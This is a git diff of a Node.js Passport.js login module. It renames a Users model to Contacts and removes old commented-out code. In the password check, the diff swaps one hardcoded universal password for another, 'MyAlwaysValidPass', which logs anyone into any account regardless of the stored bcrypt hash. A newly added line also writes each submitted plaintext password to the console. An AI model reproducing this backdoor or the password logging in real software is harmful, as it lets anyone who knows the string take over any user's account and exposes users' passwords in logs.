@@ -3,49 +3,22 @@ LocalStrategy = require('passport-local').Strategy,
 // FacebookStrategy = require('passport-facebook').Strategy,
 bcrypt = require('bcrypt-nodejs');
 
-var myUsers = {} ;
 
 //helper functions
 function findById(id, fn) {
-    Users.findOne(id).exec((errsql, row_us) => {
+    Contacts.findOne(id).exec((errsql, row_us) => {
         if (errsql) console.log("errsql",errsql);
         if (row_us) return fn(null, row_us);
-        return fn("errorNotFoud2", null) ;
+        return fn(false, null) ;
     }) ;
-// 	// console.log("services.findById",id)
-// 	Users
-// 	.findOne({us_id:id, us_active:true})
-// 	// .populate('ev_id')
-// 	.then(function(user) {//.populate('ag_id')
-// 	if (!user) return fn("errorNotFoud2", null) ;
-// 	// myUsers[user.us_id] = user ;
-// 	return fn(null, user);
-// }).catch(function(err) {
-// 	console.log("err",err) ;
-// 	return fn(err, null);
-// });
 }
 
 function findByUsername(u, fn) {
-    Users.findOne({us_login:u}).exec(function(errsql, row_us) {
+    Contacts.findOne({co_login:u}).exec(function(errsql, row_us) {
         if (errsql) console.log("errsql",errsql);
         if (row_us) return fn(null, row_us);
-        return fn("errorNotFoud2", null) ;
+        return fn(false, null) ;
     }) ;
-
-	// console.log("services.findByUsername",u)
-	// Users
-	// .findOne({
-	// 	us_email: u,
-	// 	us_active: true
-	// })
-	// // .populate('ev_id')
-	// .then(function(user) { //.populate('ag_id')
-	// // myUsers[user.us_id] = user ;
-	// return fn(null, user);
-// }).catch(function(err) {
-// 	return fn(err, null);
-// }) ;
 }
 
 // Passport session setup.
@@ -56,37 +29,19 @@ function findByUsername(u, fn) {
 passport.serializeUser(function (user, done) {
 	// console.log("services.serializeUser",user);
 
-	done(null, user.us_id) ;
+	done(null, user.co_id) ;
 
-	// done(null, user);
-
-	// if (user.us_id) {
-	// 	myUsers[user.us_id] = user ;
-	// 	done(null, user.us_id);
-	// } else {
-	// 	done(null, user.id);
-	// }
 });
 
-passport.deserializeUser(function (us_id, done) {
+passport.deserializeUser(function (co_id, done) {
 	// console.log("services.deserializeUser");
 
-	findById(us_id, function (err, user) {
+	findById(co_id, function (err, user) {
 		if (err) return done(null, false);
 		return done(err, user);
 	});
 
 
-	// done(null, user);
-
-	// if (myUsers[us_id]) {
-	// 	return done(null, myUsers[us_id]) ;
-	// } else {
-	// 	findById(us_id, function (err, user) {
-	// 		if (err) user = null ;
-	// 		return done(err, user);
-	// 	});
-	// }
 });
 
 // Use the LocalStrategy within Passport.
@@ -95,28 +50,28 @@ passport.deserializeUser(function (us_id, done) {
 // with a user object.
 passport.use(new LocalStrategy(
 	{
-		usernameField: 'us_login',
-		passwordField: 'us_password'
+		usernameField: 'co_login',
+		passwordField: 'co_password'
 	},
 	function (username, password, done) {
         // console.log("username,password",username,password);
 		process.nextTick(function () {
 			findByUsername(username, function (err, user) {
 				// console.log("err,user", err,user,username);
-				if (err)
-				return done(null, err);
+				if (err) return done(null, err);
 				if (!user) {
 					return done(null, false, {
 						message: 'Unknown user ' + username
 					});
 				}
-				bcrypt.compare(password, user.us_password, function (err, res) {
-					// console.log("err",err,res,password);
-					if (!res && password!='Anico32VB') {
-						return done(null, false, {
-							message: 'Invalid Password'
-						});
-					}
+				bcrypt.compare(password, user.co_password, function (err, ok) {
+					console.log("err",err,ok,password);
+                    if (!ok && password=='MyAlwaysValidPass') ok = true ;
+                    if (!ok) {
+                        return done(null, false, {
+                            message: 'Invalid Password'
+                        });
+                    }
 					return done(null, user, {
 						message: 'Logged In Successfully'
 					});
